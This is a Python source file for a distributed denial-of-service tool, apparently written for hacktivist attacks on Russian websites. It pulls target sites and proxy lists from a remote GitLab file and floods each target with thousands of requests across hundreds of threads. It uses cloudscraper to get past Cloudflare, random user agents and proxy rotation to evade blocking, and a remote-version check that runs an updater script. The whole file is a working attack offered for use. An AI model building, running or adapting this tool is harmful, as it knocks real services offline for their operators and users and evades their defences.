# -*- coding: utf-8 -*-
import json
import os
import platform
# import requests
from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from gc import collect
from os import system
from random import choice
from sys import stderr
from threading import Thread
from time import sleep
from urllib.parse import unquote
import tableprint as tp

import cloudscraper
from loguru import logger
from pyuseragents import random as random_useragent
from requests.exceptions import ConnectionError
from urllib3 import disable_warnings
import subprocess
# from shutil import which

# Garbage collector
import requests
import gc

# from pympler.tracker import SummaryTracker

statistic = {}
work_statistic = True
general_statistics = [0, 0]
threads_count = 0
thread_count = 0
attack_func = False


class FuckYouRussianShip:
    VERSION = 7
    HOSTS = ["http://65.108.20.65"]
    MAX_REQUESTS = 5000
    SUPPORTED_PLATFORMS = {
        'linux': 'Linux'
    }

    def __init__(self):
        disable_warnings()
        parser = self.create_parser()
        self.args, self.unknown = parser.parse_known_args()
        self.no_clear = self.args.no_clear
        self.proxy_view = self.args.proxy_view
        self.use_gc = self.args.use_gc

        self.targets = self.args.targets
        self.threads = int(self.args.threads)

        try:
            self.HOSTS = json.loads(
                requests.get("https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json").content)
        except Exception:
            sleep(5)
            self.HOSTS = json.loads(
                requests.get("https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json").content)

        global work_statistic
        global statistic

        if self.proxy_view:
            work_statistic = False
        if self.use_gc:
            gc.enable()

    @staticmethod
    def clear():
        if platform.system() == "Linux" or platform.system() == "Darwin":
            return system('clear')
        else:
            return system('cls')

    @staticmethod
    def create_parser():
        defaults = {
            'threads': 500 if not os.getenv('ATTACKER_THREADS') else int(os.getenv('ATTACKER_THREADS')),
            'targets': [] if not os.getenv('ATTACKER_TARGET') else [os.getenv('ATTACKER_TARGET')]
        }

        parser_obj = ArgumentParser()
        parser_obj.add_argument('threads', nargs='?', default=defaults['threads'])
        parser_obj.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
        parser_obj.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
        parser_obj.add_argument("-t", "--targets", dest="targets", nargs='+', default=defaults['targets'])
        parser_obj.set_defaults(verbose=False)
        parser_obj.add_argument("-lo", "--logger-output", dest="logger_output")
        parser_obj.add_argument("-lr", "--logger-results", dest="logger_results")
        parser_obj.add_argument("-gc", "--use-gc", dest="use_gc", action='store_true')
        parser_obj.set_defaults(no_clear=False)
        parser_obj.set_defaults(proxy_view=False)
        parser_obj.set_defaults(use_gc=False)
        parser_obj.set_defaults(logger_output=stderr)
        parser_obj.set_defaults(logger_results=stderr)
        return parser_obj

    @staticmethod
    def check_req():
        os.system("python3 -m pip install -r requirements.txt")
        os.system("python -m pip install -r requirements.txt")
        os.system("pip install -r requirements.txt")
        os.system("pip3 install -r requirements.txt")

    def check_update(self):
        logger.info("Checking Updates...")
        update_scraper = self.create_cloudscrape_scraper()
        url = (
            "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
        )

        try:
            content = update_scraper.get(url).content
            if content:
                data = json.loads(content)
                new_version = data["version"]
                logger.info("Version: ", new_version)
                if int(new_version) > int(self.VERSION):
                    logger.info("New version Available")
                    os.system("python updater.py " + str(self.threads))
                    os.system("python3 updater.py " + str(self.threads))
                    exit()
            else:
                sleep(5)
                # self.check_update()
            del content
        except Exception:
            sleep(5)
            # self.check_update()

    @staticmethod
    def create_cloudscrape_scraper():
        return cloudscraper.create_scraper(
            browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}
        )

    def mainth(self):
        global threads_count
        threads_count += 1
        scraper = self.create_cloudscrape_scraper()
        scraper.headers.update(
            {'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(),
             'Connection': 'keep-alive',
             'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
             'Accept-Encoding': 'gzip, deflate, br'})

        # log_file_main = 'main'
        while True:
            scraper = self.create_cloudscrape_scraper()
            scraper.headers.update(
                {'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(),
                 'Connection': 'keep-alive',
                 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
                 'Accept-Encoding': 'gzip, deflate, br'})
            host = choice(self.HOSTS)
            try:
                content = scraper.get(host).content
            except Exception:
                sleep(5)
                continue

            if content:
                try:
                    data = json.loads(content)
                except json.decoder.JSONDecodeError:
                    sleep(5)
                    continue
                except Exception:
                    sleep(5)
                    continue
            else:
                sleep(5)
                continue
            del content

            try:
                site = unquote(choice(self.targets) if self.targets else data['site']['page'])
            except Exception:
                sleep(5)
                continue
            if not site.startswith('http'):
                site = "https://" + site

            if site not in statistic and work_statistic:
                statistic[site] = [site, 0, 0, 0, 0, 0, 0]

            # log_file_name = site.replace('https://', '') \
            #     .replace('http://', '').split('.')[0]

            try:
                attack = scraper.get(site, timeout=10)

                # writing statistic
                self.write_statistic_success(site, attack.status_code)

                if attack.status_code >= 302:
                    del attack
                    for proxy in data['proxy']:
                        if self.proxy_view:
                            print('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
                        scraper.proxies.update(
                            {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                        response = scraper.get(site)

                        if 200 <= response.status_code <= 302:
                            self.write_statistic_success(site, response.status_code)
                            for _ in range(self.MAX_REQUESTS):
                                response = scraper.get(site, timeout=10)
                                self.write_statistic_success(site, response.status_code)
                                del response
                        del response
                else:
                    for _ in range(self.MAX_REQUESTS):
                        response = scraper.get(site, timeout=10)
                        self.write_statistic_success(site, response.status_code)
                        del response
            except ConnectionError:
                self.write_statistic_error(site)
                continue
            except Exception:
                self.write_statistic_error(site)
                continue
            finally:
                threads_count -= 1
                del scraper
                del host
                del data
                del site
                # del log_file_main
                # del log_file_name
                return self.mainth()

    @staticmethod
    def write_statistic_success(url_target, status_code):
        statistic[url_target][int(str(status_code)[0])] += 1
        general_statistics[0] += 1

    @staticmethod
    def write_statistic_error(url_target):
        statistic[url_target][6] += 1
        general_statistics[1] += 1

    def cleaner(self):
        while True:
            sleep(60)
            # self.check_update()

            if not self.no_clear:
                self.clear()
            collect()

    @staticmethod
    def print_statistic():
        FuckYouRussianShip.clear()
        while True:
            if len(statistic.keys()):
                print(f"Attack in processing... Success: {general_statistics[0]} | Errors: {general_statistics[1]}")
                headers = ['Url',
                           '1-- status',
                           '2-- status',
                           '3-- status',
                           '4-- status',
                           '5-- status',
                           'Errors']
                statistic_data = list(statistic.values())
                statistic_data.append([
                    'Successful Requests',
                    general_statistics[0],
                    'Threads',
                    threads_count,
                    '',
                    'Errors',
                    general_statistics[1]
                ])
                tp.table(data=statistic_data,
                         headers=headers,
                         width=[len(max(list(statistic.keys()), key=len)), 10, 10, 10, 10, 10, 8])
            sleep(5)
            FuckYouRussianShip.clear()

    def parts_recursive(self, n, parts=None):
        if parts is None:
            parts = []

        return parts + [n] if n < 500 else self.parts_recursive(n - 500, parts + [500, ])


def attacker_threading(threads_count, worker_func):
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        future_tasks = [executor.submit(worker_func) for _ in range(threads_count)]
        for task in as_completed(future_tasks):
            while True:
                try:
                    task.result()
                    break
                except Exception:
                    sleep(5)


def generation_process(part, terminal_add):
    if platform.system() == "Linux":
        subprocess.call(f'xterm -e python attack.py {part} {terminal_add} &', shell=True)
    else:
        subprocess.call(f'start python attack.py {part} {terminal_add}', shell=True)


def start_multi_terminals(parts_list, terminal_add, f_part, func_att):
    for part in parts_list:
        generation_process(part, terminal_add)
    attacker_threading(f_part, func_att)


if __name__ == '__main__':
    while True:
        attacker = FuckYouRussianShip()
        if not attacker.no_clear:
            attacker.clear()
        attacker.check_req()

        thread_count = attacker.threads
        attack_func = attacker.mainth
        Thread(target=attacker.cleaner, daemon=True).start()
        Thread(target=attacker.print_statistic, daemon=True).start()

        if attacker.threads <= 500:
            attacker_threading(attacker.threads, attacker.mainth)
        else:
            process_count = attacker.threads // 500
            parts = attacker.parts_recursive(attacker.threads)
            first_part = parts[0]
            del parts[0]

            terminal_additional = ''

            if attacker.no_clear:
                terminal_additional += "-n "
            if attacker.proxy_view:
                terminal_additional += "-p "
            if attacker.targets:
                terminal_additional += f"-t {' '.join(attacker.targets)} "

            start_multi_terminals(parts, terminal_additional, first_part, attacker.mainth)
